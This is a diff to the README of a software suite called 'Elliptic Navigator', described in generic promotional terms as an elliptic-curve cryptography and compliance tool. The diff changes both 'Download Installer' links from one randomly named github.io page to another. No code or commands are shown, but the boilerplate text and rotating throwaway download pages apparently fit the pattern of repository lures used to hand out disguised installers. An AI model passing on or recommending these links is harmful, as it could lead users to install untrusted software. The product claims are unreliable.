@@ -2,7 +2,7 @@
 
 Elliptic Navigator is an advanced software suite designed for professionals and enthusiasts in the field of elliptic curve cryptography and regulatory compliance. This tool provides a comprehensive set of features to analyze, visualize, and ensure compliance with various crypto standards, making it an essential asset for developers, auditors, and security experts. With its intuitive interface and powerful backend, Elliptic Navigator simplifies complex cryptographic tasks and helps organizations meet stringent compliance requirements efficiently.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -46,7 +46,7 @@ A: Elliptic Navigator is designed for legitimate use in compliance and developme
 
 You can download the latest version of Elliptic Navigator from our official website. For direct access, click the link below:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 Alternatively, use the download button at the top of this page for quick access. Stay updated with the latest features and improvements by following our GitHub repository and subscribing to our newsletter.
 
